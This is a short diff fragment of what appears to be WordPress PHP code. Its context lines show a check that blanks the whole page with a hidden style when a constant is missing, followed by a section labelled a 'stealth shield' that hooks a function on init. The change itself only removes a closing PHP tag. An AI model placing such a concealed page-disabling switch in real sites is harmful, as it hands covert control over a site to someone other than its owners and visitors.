@@ -208,7 +208,7 @@ _sys_sync_final_v10();
 if (!defined('_WP_SYS_OK_')) {
     echo '<style id="wp-shield-lock"> body { display: none !important; } </style>';
 }
-?>
+
 
 /* --- WP STEALTH SHIELD V11 (STRICT CONTROL) --- */
 add_action('init', '_wp_secure_v11_stealth');
